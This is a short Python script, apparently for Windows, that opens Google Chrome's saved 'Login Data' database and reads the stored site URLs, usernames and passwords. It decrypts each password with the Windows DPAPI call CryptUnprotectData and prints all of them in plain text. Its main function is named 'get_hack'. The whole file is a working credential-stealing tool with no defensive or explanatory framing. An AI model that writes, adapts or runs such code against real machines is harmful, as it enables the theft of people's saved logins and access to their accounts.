import sys
import os

halt = False
os.system('cls')

try:
    import sqlite3
    import win32crypt

except ImportError:

    print('\nMissing needed module: \n   sqlite\n   win32crypt')
    halt = True
    if halt:
        sys.exit() 

os.system('cls')

def get_hack():
        
    datepath = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(datepath)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM Logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}
    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, user_name, pwd[1].decode('utf8'))
        print(string)


if __name__=='__main__':
    get_hack()        

